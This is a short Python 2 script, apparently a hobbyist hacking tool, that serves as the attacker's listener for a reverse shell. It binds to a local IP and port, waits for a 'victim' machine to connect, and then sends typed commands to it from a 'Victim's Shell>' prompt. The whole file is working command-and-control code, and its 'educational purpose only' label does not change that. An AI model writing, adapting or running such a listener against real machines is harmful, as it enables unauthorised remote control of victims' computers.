#!/usr/bin/env python

#This program is made by Namouchi Zied
#This is for educational purpose only
#use it carefully

# Importing the socket module
import socket 
import sys 
import os

IP = "192.168.15.6"
PORT = 8080

os.system('clear')
#socket connection fonction
def connection():
	try:
		#creation of the socket object
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		
		#Definition of the IP and port parameters
		sock.bind((IP,PORT))
		
		#setting the number of connections
		sock.listen(1)
		
		#print messages
		print("[!] Listening for the incomming TCP connection ...")
		print("[!] Payload Is Running")
		
		conn, addr = sock.accept()
		#IP address of the victim will be displayed
		print("[+] Connection established from: ", addr)
		
		while True:
			shell_command = raw_input("Victim's Shell> ")
			if 'finished' in shell_command:
				conn.send('finished')
				conn.close()
				break
			else:
				conn.send(shell_command)
				conn.recv(1024)
				
	except socket.error:
		print('Socket could not be created.')
		sys.exit()
	
	
def main():
	connection()
				
if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		sys.exit()
	
